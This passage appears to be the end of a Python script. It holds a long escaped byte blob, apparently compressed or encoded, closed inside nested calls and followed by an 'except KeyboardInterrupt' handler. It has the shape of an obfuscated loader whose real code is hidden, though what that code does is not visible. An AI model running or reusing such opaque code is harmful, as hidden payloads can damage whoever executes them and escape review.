\x0c\x12#\xc4\x0b\xa8\x7f\x8bR\x19P\xa0\x01\xc9\xc4\xdb"\xf9\xefp\xc9]1\x9fXD-i\xae\x8cB\x94\x15\xb6\xbb\xe1\x13p\xa7\x92"d\xf6d<\xe9\xd3\xd5q\xc9\x17\xbf\x963\x8bV\x99\xa9n\xf8\x8a\n\x05~\xd6\x9bs\xb1\x97\xdb\xcb\xb4\x89@C\x89\xd1{i\x16a\x1eC\xb8\xa8\rW\xf0\xef\xc9Q[\xe8\xd2Cv\x8c+\xfa\x87\x1f\x93\x86\\\x97j8\' \xc0\xder\x03\xc9\x8aV\xf3\xfc\rUG\xa5e\xd3\xfaC\x1e\xca<\x0b\xce\xbb\xec\xb1\x93\x9a\xbd\x0b\x92\x8c.].vx\xba\x8c\xfc|\xcevM\xc7\xd1\x91\xd8}@\xc7M\r\x9d\xee5K(\xbfm\x8f\xadP\xca>\x90K\x85\xd8g\xf0U\x84\xdb\xfb\xeb\x13#\xd8X\xe8\x90\xb0a\xa6\xeaF\xd9\x14u\xc2\xc0\xf2\xf9\xe9\xdb\xe5H/2\xbeh\x9f\x81\xb3dLb\x1e\x9c\x11\xe8;Q\xa6\x11\x9f\x9f\x00t_0\x1f\x10a\x15\xce\xce\xd8\xd9\xc5\xd2\xd8v\x15\xda\xd6\xdb\xcex\x15\xfa\x87\xb7\x95\xe3*\x94\x897\xdb*\xbc\x89\x95\xbd\xb1\x8b\xa9\x95\xd5*\xb4\xb7\xad\x95\xc9*\xb4\xb9\xa7\xb9\xe9*\x8c\xad\x83\xb1\x99\xcb*\xa2\x99\xb9\xa9\x83\x9d\xa3\xb3\xb9\x8bK9\xe0\xf6?\xd7z_\x10\x95\xbd\x98$\xdd\\L\x8d]\xcd_\xe0\xf9\xed\x1c\xcc\xdcl\xcd\x05\x9dQ\xfe{\xfd\x17\x00p)\xfa\xd7]AA@@,\x03\xe8\xa7\xff\xffhe\x1ce\x1cu_\xea\xe0\x1a\xbf\xb48\xb4\x98u8\\\x01\x00J\x10*\x1ep\xd7\x00\x80\x90\xaa\x07\xdc\xdd\xff\xe0\x9f\xb1\xaa\xfd\xd7\xfe\x83\x7f\xc6\xa8\xfe_\xfb\x0f\xae\xfe\xdf\xe0\x8c\xfco\xa2\xff\x07\x90\xfeW\x7f')))
except KeyboardInterrupt:
	exit()